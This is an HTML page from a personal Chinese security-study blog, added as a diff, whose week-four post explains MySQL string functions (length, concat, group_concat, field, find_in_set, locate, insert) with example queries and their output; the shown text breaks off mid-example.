@@ -1,0 +1,1483 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.ico" />
+    
+
+    <title>
+        
+          004_第四周—数据库系统功能相关学习 - 信安之路学习纪录
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- Noto Sans TC -->
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+TC" rel="stylesheet">
+    <!-- Noto Sans SC -->
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC" rel="stylesheet">
+    <!-- Noto Sans -->
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans" rel="stylesheet">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('img')
+})
+</script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+
+<div class="container">
+  <div class="book-container">
+    <div class="columns">
+      <div class="column col-2 hide-lg">
+        <div class="book-sidebar">
+  <h4 class="site-meta">
+    <a href="/">信安之路学习纪录</a>
+  </h4>
+  <div class="sidebar-content">
+    <p>Dave’s Blog</p>
+<ul>
+<li><a href="/archives/index.html">00-文章归档</a></li>
+<li>01-信安小白计划
+<ul>
+<li>01-Web安全
+<ul>
+<li><a href="https://lauwarrior.github.io/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/001_%E7%AC%AC%E2%BC%80%E5%91%A8%E2%80%94%E5%AD%A6%E7%B1%8D%E5%A4%87%E6%A1%88%E4%BB%A5%E5%8F%8A%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/index.html">001_第⼀周—学籍备案以及环境准备</a></li>
+<li><a href="https://lauwarrior.github.io/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/002_%E7%AC%AC%E4%BA%8C%E5%91%A8%E2%80%94%E8%AE%A4%E8%AF%86sql%E5%B9%B6%E5%AD%A6%E4%B9%A0%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/index.html">002_第二周—认识sql并学习数据库的基础操作</a></li>
+<li><a href="https://lauwarrior.github.io/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/003_%E7%AC%AC%E4%B8%89%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E8%A1%A8%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/index.html">003_第三周—数据库系统表相关学习</a></li>
+<li><a href="https://lauwarrior.github.io/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/index.html">004_第四周—数据库系统功能相关学习</a></li>
+<li><a href="https://lauwarrior.github.io/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/005_%E7%AC%AC%E5%85%AD%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/index.html">005_第六周—数据库相关注入语句的收集和学习</a></li>
+</ul>
+</li>
+<li>02-渗透测试
+<ul>
+<li>暂未学习</li>
+</ul>
+</li>
+<li>03-红蓝对抗
+<ul>
+<li>暂未学习</li>
+</ul>
+</li>
+<li>04-学二进制
+<ul>
+<li>暂未学习</li>
+</ul>
+</li>
+<li>05-病毒分析
+<ul>
+<li>暂未学习</li>
+</ul>
+</li>
+<li>06-安全建设
+<ul>
+<li>暂未学习</li>
+</ul>
+</li>
+<li>07-应急响应
+<ul>
+<li>暂未学习</li>
+</ul>
+</li>
+<li>08-成长经验
+<ul>
+<li>暂未学习</li>
+</ul>
+</li>
+<li>09-安全工具
+<ul>
+<li>暂未学习</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>02-靶机实战
+<ul>
+<li>01-VulnHub
+<ul>
+<li>暂未学习</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>03-Python学习
+<ul>
+<li>暂未学习</li>
+</ul>
+</li>
+<li>04-网络建站
+<ul>
+<li>暂未学习</li>
+</ul>
+</li>
+<li>05-kali学习
+<ul>
+<li>暂未学习</li>
+</ul>
+</li>
+<li>06-其他
+<ul>
+<li><a href="https://lauwarrior.github.io/06-%E5%85%B6%E4%BB%96/001_%E4%BD%BF%E7%94%A8hexo+github%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B(%E8%BD%AC%E8%BD%BD)/index.html">001_使用hexo+github搭建免费个人博客详细教程(转载)</a></li>
+<li><a href="https://lauwarrior.github.io/06-%E5%85%B6%E4%BB%96/002_%E5%88%A9%E7%94%A8github%E5%92%8Chexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/index.html">002_利用github和hexo搭建个人博客</a></li>
+</ul>
+</li>
+</ul>
+
+  </div>
+</div>
+
+
+<script src="/js/book-sidebar.js"></script>
+
+
+<script>
+collapse_sidebar(1)
+highlight_tab()
+show_sidebar()
+</script>
+      </div>
+
+      <div class="column col-8 col-lg-12">
+        <div class="book-content">
+          <div class="book-navbar">
+  <header class="navbar">
+  <section class="navbar-section">
+    <img class="navbar-icon" src="/favicon.ico">
+  </section>
+  <section class="navbar-center">
+    信安之路学习纪录
+  </section>
+  <section class="navbar-section">
+    <label class="accordion-header c-hand" for="accordion-sidebar">
+      <i class="icon icon-menu"></i>
+    </label>
+  </section>
+</header>
+
+<div class="accordion">
+  <input type="checkbox" id="accordion-sidebar" name="accordion-checkbox" hidden>
+  <div class="accordion-body">
+    <p>Dave’s Blog</p>
+<ul>
+<li><a href="/archives/index.html">00-文章归档</a></li>
+<li>01-信安小白计划
+<ul>
+<li>01-Web安全
+<ul>
+<li><a href="https://lauwarrior.github.io/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/001_%E7%AC%AC%E2%BC%80%E5%91%A8%E2%80%94%E5%AD%A6%E7%B1%8D%E5%A4%87%E6%A1%88%E4%BB%A5%E5%8F%8A%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/index.html">001_第⼀周—学籍备案以及环境准备</a></li>
+<li><a href="https://lauwarrior.github.io/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/002_%E7%AC%AC%E4%BA%8C%E5%91%A8%E2%80%94%E8%AE%A4%E8%AF%86sql%E5%B9%B6%E5%AD%A6%E4%B9%A0%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/index.html">002_第二周—认识sql并学习数据库的基础操作</a></li>
+<li><a href="https://lauwarrior.github.io/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/003_%E7%AC%AC%E4%B8%89%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E8%A1%A8%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/index.html">003_第三周—数据库系统表相关学习</a></li>
+<li><a href="https://lauwarrior.github.io/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/index.html">004_第四周—数据库系统功能相关学习</a></li>
+<li><a href="https://lauwarrior.github.io/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/005_%E7%AC%AC%E5%85%AD%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/index.html">005_第六周—数据库相关注入语句的收集和学习</a></li>
+</ul>
+</li>
+<li>02-渗透测试
+<ul>
+<li>暂未学习</li>
+</ul>
+</li>
+<li>03-红蓝对抗
+<ul>
+<li>暂未学习</li>
+</ul>
+</li>
+<li>04-学二进制
+<ul>
+<li>暂未学习</li>
+</ul>
+</li>
+<li>05-病毒分析
+<ul>
+<li>暂未学习</li>
+</ul>
+</li>
+<li>06-安全建设
+<ul>
+<li>暂未学习</li>
+</ul>
+</li>
+<li>07-应急响应
+<ul>
+<li>暂未学习</li>
+</ul>
+</li>
+<li>08-成长经验
+<ul>
+<li>暂未学习</li>
+</ul>
+</li>
+<li>09-安全工具
+<ul>
+<li>暂未学习</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>02-靶机实战
+<ul>
+<li>01-VulnHub
+<ul>
+<li>暂未学习</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>03-Python学习
+<ul>
+<li>暂未学习</li>
+</ul>
+</li>
+<li>04-网络建站
+<ul>
+<li>暂未学习</li>
+</ul>
+</li>
+<li>05-kali学习
+<ul>
+<li>暂未学习</li>
+</ul>
+</li>
+<li>06-其他
+<ul>
+<li><a href="https://lauwarrior.github.io/06-%E5%85%B6%E4%BB%96/001_%E4%BD%BF%E7%94%A8hexo+github%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B(%E8%BD%AC%E8%BD%BD)/index.html">001_使用hexo+github搭建免费个人博客详细教程(转载)</a></li>
+<li><a href="https://lauwarrior.github.io/06-%E5%85%B6%E4%BB%96/002_%E5%88%A9%E7%94%A8github%E5%92%8Chexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/index.html">002_利用github和hexo搭建个人博客</a></li>
+</ul>
+</li>
+</ul>
+
+  </div>
+</div>
+</div>
+
+<div class="book-post">
+  <p><strong>第四周 任务名称：数据库系统功能相关学习</strong></p>
+<hr>
+<p>[TOC]</p>
+<hr>
+<h1 id="背景">背景</h1>
+<p><strong>学习目标：</strong></p>
+<ol>
+<li>学习数据库自带函数的功能与用法（思考在什么情况下可以执行命令）</li>
+<li>将所有涉及的函数进行测试并举例说明其用法</li>
+<li>针对自己所选数据库，构造所需环境，尝试执行系统命令</li>
+</ol>
+<h1 id="一、MySQL-函数">一、MySQL 函数</h1>
+<p><code>help  XXXX ;   #sql下函数用法帮助</code></p>
+<h2 id="1-字符串函数">1 字符串函数</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">函数</th>
+<th style="text-align:left">描述</th>
+<th style="text-align:left">实例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">ASCII(s)</td>
+<td style="text-align:left">返回字符串第一个字母的ascii值</td>
+<td style="text-align:left">select ASCII(“str”);</td>
+</tr>
+<tr>
+<td style="text-align:left">CHAR_LENGTH(s)</td>
+<td style="text-align:left">返回字符串的字符数</td>
+<td style="text-align:left">select CHAR_LENGTH(“str”);</td>
+</tr>
+<tr>
+<td style="text-align:left">CONCAT(s1,s2……sn) CONCAT_WS(s1,s2……sn)</td>
+<td style="text-align:left">多个字符串合并为一个字符串</td>
+<td style="text-align:left">select CONCAT(s1,s2……sn);</td>
+</tr>
+<tr>
+<td style="text-align:left">FIELD(s,s1,s2……)</td>
+<td style="text-align:left">返回第一个字符在字符串列表(s1，s2……)的位置</td>
+<td style="text-align:left">select(“s”,”a”,”b”,”c”,”s”);</td>
+</tr>
+<tr>
+<td style="text-align:left">FIELD(s,s1,s2……) FIND_IN_SET(s1,s2)</td>
+<td style="text-align:left">查找字符串的位置</td>
+<td style="text-align:left">select field(“a”,”c”,”aa”,”a”);  select find_in_set(“a”,”e,a,z”);</td>
+</tr>
+<tr>
+<td style="text-align:left">FORMAT(x,n)</td>
+<td style="text-align:left">将x格式化，将x保留到小数点后n位，最后一位四舍五入</td>
+<td style="text-align:left">select format(25.7896,2);</td>
+</tr>
+<tr>
+<td style="text-align:left">INSERT(s1,x,len,s2)</td>
+<td style="text-align:left">字符串替换，s2替换s1的x位置开始长度为len的字符串</td>
+<td style="text-align:left">select insert(”<a href="http://google.com" target="_blank" rel="noopener">google.com</a>“,1,6,”runnob”); –输出为：<a href="http://runnob.com" target="_blank" rel="noopener">runnob.com</a></td>
+</tr>
+<tr>
+<td style="text-align:left">LOCATE(s1,s)</td>
+<td style="text-align:left">从字符串s中获取字符串s1的开始位置</td>
+<td style="text-align:left">select locate(“ap”,”happy”);</td>
+</tr>
+<tr>
+<td style="text-align:left">LCASE(s) LOWER(s)</td>
+<td style="text-align:left">将字符串全部变成小写字母</td>
+<td style="text-align:left">select lcase(“ShAdoW”); select lower(“ShAdoW”);</td>
+</tr>
+<tr>
+<td style="text-align:left">UCASE(s) UPPER(s)</td>
+<td style="text-align:left">将字符串全部变成大写字母</td>
+<td style="text-align:left">select ucase(“shadow”); select upper(“shadow”);</td>
+</tr>
+<tr>
+<td style="text-align:left">LEFT(s,n)</td>
+<td style="text-align:left">返回字符串s的前n个字符</td>
+<td style="text-align:left">select lower(“ShAdoW”,2);</td>
+</tr>
+<tr>
+<td style="text-align:left">LPAD(s1,len,s2)</td>
+<td style="text-align:left">在字符串s1前填充字符串s2，直到字符串长度到达len</td>
+<td style="text-align:left">select lpad(“abc”,5,”x”);</td>
+</tr>
+<tr>
+<td style="text-align:left">LTRIM(s)</td>
+<td style="text-align:left">去除字符串s前的空格</td>
+<td style="text-align:left">select ltrim(“ soya”);</td>
+</tr>
+<tr>
+<td style="text-align:left">TRIM(s)</td>
+<td style="text-align:left">去除字符串前后的空格</td>
+<td style="text-align:left">select trim(“ soya “);</td>
+</tr>
+<tr>
+<td style="text-align:left">SPACE(n)</td>
+<td style="text-align:left">返回n个空格</td>
+<td style="text-align:left">select space(10);</td>
+</tr>
+<tr>
+<td style="text-align:left">STRCMP(s1,s2)</td>
+<td style="text-align:left">比较字符串s1和s2，如果s1和s2相等返回0，若s1&gt;s2返回1，反之返回-1</td>
+<td style="text-align:left">select strcmp(“soya”,”soya”);</td>
+</tr>
+<tr>
+<td style="text-align:left">SUBSTR(s,start,len) SUBSTRING(s,start,len)</td>
+<td style="text-align:left">从字符串s的start位置开始，截取长度为len的字符串。</td>
+<td style="text-align:left">select substring(“shadow”,2,3);</td>
+</tr>
+</tbody>
+</table>
+<h3 id="1-1-字符串长度">1.1 字符串长度</h3>
+<blockquote>
+<ul>
+<li><code>length(s)</code></li>
+<li><code>char_length(s)</code></li>
+<li><code>character_length(s)</code></li>
+</ul>
+</blockquote>
+<p>**描述：**返回字符串 s 的长度。</p>
+<p>**实例：**返回字符串 “Hello World!” 的长度。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select length(&quot;Hello World&quot;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| length(&quot;Hello World&quot;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                    11 |</span><br><span class="line">+-----------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select char_length(&quot;Hello World&quot;); #或者 select character_length(&quot;Hello World&quot;);</span><br><span class="line">+----------------------------+</span><br><span class="line">| char_length(&quot;Hello World&quot;) |</span><br><span class="line">+----------------------------+</span><br><span class="line">|                         11 |</span><br><span class="line">+----------------------------+</span><br></pre></td></tr></table></figure>
+<h3 id="1-2-字符串拼接">1.2 字符串拼接</h3>
+<blockquote>
+<ul>
+<li><code>concat(s1, s2..…, sn)</code>，将多个字符串 s1, s2…… 合并为一个字符串</li>
+<li><code>concat_ws(separator, s1, s2, ..…)</code>，功能和 concat 函数一样，但带有分隔符</li>
+<li><code>group_concat()</code>，将同一列的内容进行拼接</li>
+</ul>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat(s1, s2..…, sn)</span><br></pre></td></tr></table></figure>
+<p>**描述：**将多个字符串 s1, s2…… 合并为一个字符串，如果 s1, s2…… 中有为 NULL 值得字符串则返回 NULL 值。</p>
+<p>**实例：**从 comments 表中选择 id, comment 字段，并使用 concat 函数合并为 info 字段。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat(id,&#39; &#39;,comment) as info from comments;</span><br><span class="line">+-----------------------------+</span><br><span class="line">| info                        |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| 1 test                      |</span><br><span class="line">| 2 hhhh                      |</span><br><span class="line">| 3 Need lots of improvements |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure>
+<p>**描述：**功能和 concat 函数一样，但带有分隔符，<strong>如果分隔符为 NULL，则函数返回 NULL，而字符串为 NULL 则略过。</strong></p>
+<p>**实例：**从 comments 表中选择 id, comment, comment 字段，并使用 concat_ws 函数, 以 “,” 为分隔符，合并为 infos 字段。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat_ws(&#39;,&#39;,id,comment,comment) as infos from comments;</span><br><span class="line">+-------------------------------------------------------+</span><br><span class="line">| infos                                                  |</span><br><span class="line">+-------------------------------------------------------+</span><br><span class="line">| 1,test,test                                           |</span><br><span class="line">| 2,hhhh,hhhh                                           |</span><br><span class="line">| 3,Need lots of improvements,Need lots of improvements |</span><br><span class="line">+-------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+<p><strong>描述：</strong> 比较直观的理解是 <code>concat()</code> ，<code>concat_ws()</code> 将不同列的同一行内容进行拼接，而<code>group_concat()</code> 将同一列的内容进行拼接。</p>
+<p><strong>语法：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GROUP_CONCAT([DISTINCT] expr [,expr ...] # distinct，表示插叙的结果不能重复</span><br><span class="line">             [ORDER BY &#123;unsigned_integer | col_name | expr&#125;</span><br><span class="line">                 [ASC | DESC] [,col_name ...]]</span><br><span class="line">             [SEPARATOR str_val]) # seperator:拼接分隔符，默认为 &#39;,&#39;</span><br></pre></td></tr></table></figure>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select group_concat(comment order by comment separator &#39;|&#39;) from comments;</span><br><span class="line">+----------------------------------------------------------------+</span><br><span class="line">| group_concat(comment order by comment separator &#39;|&#39;)           |</span><br><span class="line">+----------------------------------------------------------------+</span><br><span class="line">| Come on!|Come on!|Come on!|hhhh|Need lots of improvements|test |</span><br><span class="line">+----------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+<h3 id="1-3-字符串查找">1.3 字符串查找</h3>
+<blockquote>
+<ul>
+<li><code>field(sv, v1, v2..…)</code>，在列表 v1, v2… 中 查找值 sv 的位置</li>
+<li><code>find_in_set(sv, slist)</code>，搜索值 sv 在字符串列表 slist 中得位置，slist 中的值以 “,” 分开</li>
+<li><code>instr(string, substring)</code> | <code>locate(substring, string, [start])</code> | <code>position(subtring in string)</code> , <code>locate()</code>，函数可指定从字符串 string 的 start 位置处开始搜索 substring</li>
+</ul>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">field(sv, v1, v2..…)</span><br></pre></td></tr></table></figure>
+<p>**描述：**搜索值 sv 在列表 v1, v2…… 中得位置，如果 sv 为 NULL 或者 sv 不在列表中则返回0值。</p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select field(&#39;a&#39;, &#39;Happy&#39;,&#39;day&#39;,&#39;A&#39;,&#39;a&#39;);</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| field(&#39;a&#39;, &#39;Happy&#39;,&#39;day&#39;,&#39;A&#39;,&#39;a&#39;) | #可见搜索不区分大小写，返回第一次搜索值出现得位置</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 3 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line"># 在表中查找</span><br><span class="line">mysql&gt; select field(&#39;hhhh&#39;, group_concat(comment)) from comments;</span><br><span class="line">+------------------------+</span><br><span class="line">| field(&#39;hhhh&#39;, comment) |</span><br><span class="line">+------------------------+</span><br><span class="line">|                      0 |</span><br><span class="line">|                      1 |</span><br><span class="line">|                      0 |</span><br><span class="line">|                      0 |</span><br><span class="line">|                      0 |</span><br><span class="line">|                      0 |</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure>
+<p>**描述：**搜索值 sv 在字符串列表 slist 中得位置，slist 中的值以 “,” 分开。如果值 sv 不在列表中获知 slist 为空字符串，则返回 0，如果 slist 为 NULL，则返回 NULL。</p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select find_in_set(&#39;a&#39;, &#39;Not an, easy,question,a,A,a&#39;);</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">| find_in_set(&#39;a&#39;, &#39;Not an, easy,question,a,A,a&#39;) |</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">|                                               4 |</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">#slist 中的值是以&quot;,&quot;作为分隔符，分隔符之间的内容都是值的内容，包括空格。</span><br><span class="line">mysql&gt; select find_in_set(&#39;a&#39;, &#39;Not an, easy,question, a,A,a&#39;);</span><br><span class="line">+--------------------------------------------------+</span><br><span class="line">| find_in_set(&#39;a&#39;, &#39;Not an, easy,question, a,A,a&#39;) |</span><br><span class="line">+--------------------------------------------------+</span><br><span class="line">|                                                5 |</span><br><span class="line">+--------------------------------------------------+</span><br></pre></td></tr></table></figure>
+<p>**描述:**查找字符串 substring 在 string 中出现的位置，如果 substring 不在 string 中，返回 0 。locate()`函数可指定从字符串 string 的 start 位置处开始搜索 substring。</p>
+<p><strong>实例:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select instr(&quot;Proud of you!&quot;, &quot;you&quot;);</span><br><span class="line">+-------------------------------+</span><br><span class="line">| instr(&quot;Proud of you!&quot;, &quot;you&quot;) |</span><br><span class="line">+-------------------------------+</span><br><span class="line">|                            10 |</span><br><span class="line">+-------------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select locate(&quot;you&quot;, &quot;Proud of you!&quot;);</span><br><span class="line">+--------------------------------+</span><br><span class="line">| locate(&quot;you&quot;, &quot;Proud of you!&quot;) |</span><br><span class="line">+--------------------------------+</span><br><span class="line">|                             10 |</span><br><span class="line">+--------------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select locate(&quot;you&quot;, &quot;Proud of you!&quot;, 11); #从第11个字符开始搜索，搜索失败</span><br><span class="line">+------------------------------------+</span><br><span class="line">| locate(&quot;you&quot;, &quot;Proud of you!&quot;, 11) |</span><br><span class="line">+------------------------------------+</span><br><span class="line">|                                  0 |</span><br><span class="line">+------------------------------------+</span><br></pre></td></tr></table></figure>
+<h3 id="1-4-字符串修改">1.4 字符串修改</h3>
+<blockquote>
+<ul>
+<li><code>insert(s1, pos, num, s2)</code> ， 字符串插入</li>
+<li><code>replace(s, olds, news)</code>，字符串替换</li>
+<li><code>lpad(s, len, pads)</code> | <code>rpad(s, len, pads)</code>，字符串填充</li>
+<li><code>trim(s)</code> | <code>ltrim(s)</code> | <code>rtrim(s)</code>，字符串裁剪，去首位空格</li>
+<li><code>lcase(s)</code> | <code>lower(s)</code> ，字符串英文小写</li>
+<li><code>ucase(s)</code> | <code>uppser(s)</code>，字符串英文大写</li>
+<li><code>reverse(s)</code> ，字符串逆序</li>
+</ul>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert(s1, pos, num, s2)</span><br></pre></td></tr></table></figure>
+<p><strong>描述：</strong> 在字符串 s1 位置插入字符串 s2， num 表示要替换的字符数，如果不需要替换，则使用 0 值。</p>
+<p><strong>实例：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#替换式插入</span><br><span class="line">mysql&gt; select insert(&quot;What a bad day!&quot;, 8, 3,&quot;good&quot;);</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| insert(&quot;What a bad day!&quot;, 8, 3,&quot;good&quot;) |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| What a good day!                       |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">#不进行替换，直接插入</span><br><span class="line">mysql&gt; select insert(&quot;What a bad day!&quot;, 8, 0,&quot;good&quot;);</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| insert(&quot;What a bad day!&quot;, 8, 0,&quot;good&quot;) |</span><br><span class="line">+----------------------------------------+</span><br><span 